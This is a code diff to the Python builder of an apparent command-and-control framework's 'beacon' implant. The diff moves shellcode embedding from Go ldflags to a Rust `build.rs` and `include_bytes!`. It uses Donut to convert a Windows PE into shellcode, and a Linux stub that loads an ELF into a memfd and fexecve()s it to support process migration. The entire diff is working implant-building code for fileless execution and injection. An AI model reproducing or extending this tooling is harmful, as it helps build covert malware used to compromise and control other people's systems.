@@ -1335,14 +1361,17 @@ class BeaconBuilder:
         produced a PE that runs as a full beacon but has no
         injector payload. This method:
 
-          1. Runs Donut on that PE to produce base64 shellcode.
-          2. Sets the shellcode on the config.
-          3. Rebuilds with `-X main.InjectorShellcodeB64=...`.
+          1. Runs Donut on that PE to produce shellcode.
+          2. Writes the shellcode to a temp file.
+          3. Rebuilds with `TC2_INJECTOR_SHELLCODE_PATH` pointing
+             at that file; `build.rs` reads it and `include_bytes!`s
+             it into the second-pass binary.
           4. Replaces the pass-1 output with the pass-2 binary.
 
         The two passes are functionally equivalent beacons.
         Only the second is shipped. They differ in that pass 2
-        has the pass-1 binary (as shellcode) embedded in it. The
+        has the pass-1 binary (as shellcode) embedded in it via
+        `build.rs` and `include_bytes!`. The
         self-reference this implies is unavoidable: pass 2's
         binary would have to contain a copy of itself for the
         embedded shellcode to be byte-identical to the parent,
@@ -1412,17 +1441,24 @@ class BeaconBuilder:
         print(f'[build] injection enabled: running second pass '
               f'(embedded shellcode is {size_mb:.1f} MB)')
 
-        saved = cfg.injector_shellcode_b64
-        cfg.injector_shellcode_b64 = shellcode_b64
+        import tempfile
+        sh_file = tempfile.NamedTemporaryFile(
+            mode='wb', suffix='.bin', delete=False)
         try:
+            sh_file.write(base64.b64decode(shellcode_b64))
+            sh_file.close()
+            inject_env = {**env, 'TC2_INJECTOR_SHELLCODE_PATH': sh_file.name}
             tmp_out = out + '.pass2'
-            ldflags = self._build_ldflags(cfg, profile)
-            cmd = self._build_command(cfg, ldflags, tmp_out)
-            subprocess.run(cmd, env=env, cwd=self.agent_dir,
+            cmd = self._build_command(cfg)
+            subprocess.run(cmd, env=inject_env, cwd=self.agent_dir,
                            check=True)
+            self._copy_artifact(cfg, tmp_out)
             os.replace(tmp_out, out)
         finally:
-            cfg.injector_shellcode_b64 = saved
+            try:
+                os.unlink(sh_file.name)
+            except OSError:
+                pass
 
         final_mb = os.path.getsize(out) / (1024 * 1024)
         print(f'[build] injection enabled: final binary is '
@@ -1435,14 +1471,15 @@ class BeaconBuilder:
         """Linux second pass.
 
         Reads the pass-1 ELF, prepends the vendored ELF-loader
-        stub, base64-encodes the concatenation, and rebuilds with
-        the shellcode embedded via -X main.InjectorShellcodeB64.
+        stub, writes the concatenation to a temp file, and rebuilds
+        with `TC2_INJECTOR_SHELLCODE_PATH` pointing at it.
 
         The stub is a fixed blob at beacon/bin/
-        inject_linux_stub.bin. Its contract with inject_linux.go:
-        it is position-independent, it locates the ELF that
-        immediately follows it in the mapped region, writes that
-        ELF into a memfd, and fexecve()s the descriptor.
+        inject_linux_stub.bin. Its contract with
+        `agent/src/inject_linux.rs`: it is position-independent, it
+        locates the ELF that immediately follows it in the mapped
+        region, writes that ELF into a memfd, and fexecve()s the
+        descriptor.
 
         Donut is not consulted — it emits PE loaders, not ELF
         loaders. The stub is architecture-specific and is
@@ -1473,7 +1510,7 @@ class BeaconBuilder:
                   f'{stub_path}. The built agent will support '
                   f'`migrate --self` only; `migrate <pid>` will '
                   f'refuse at runtime. See the note in '
-                  f'agent/core/inject_linux.go for how to build '
+                  f'agent/src/inject_linux.rs for how to build '
                   f'the stub.')
             return out
 
@@ -1497,17 +1534,24 @@ class BeaconBuilder:
               f'(stub {stub_kb} KB + ELF {elf_mb:.1f} MB = '
               f'{len(shellcode) / (1024 * 1024):.1f} MB embedded)')
 
-        saved = cfg.injector_shellcode_b64
-        cfg.injector_shellcode_b64 = shellcode_b64
+        import tempfile
+        sh_file = tempfile.NamedTemporaryFile(
+            mode='wb', suffix='.bin', delete=False)
         try:
+            sh_file.write(stub + elf_bytes)
+            sh_file.close()
+            inject_env = {**env, 'TC2_INJECTOR_SHELLCODE_PATH': sh_file.name}
             tmp_out = out + '.pass2'
-            ldflags = self._build_ldflags(cfg, profile)
-            cmd = self._build_command(cfg, ldflags, tmp_out)
-            subprocess.run(cmd, env=env, cwd=self.agent_dir,
+            cmd = self._build_command(cfg)
+            subprocess.run(cmd, env=inject_env, cwd=self.agent_dir,
                            check=True)
+            self._copy_artifact(cfg, tmp_out)
             os.replace(tmp_out, out)
         finally:
-            cfg.injector_shellcode_b64 = saved
+            try:
+                os.unlink(sh_file.name)
+            except OSError:
+                pass
 
         final_mb = os.path.getsize(out) / (1024 * 1024)
         print(f'[build] injection enabled: final binary is '
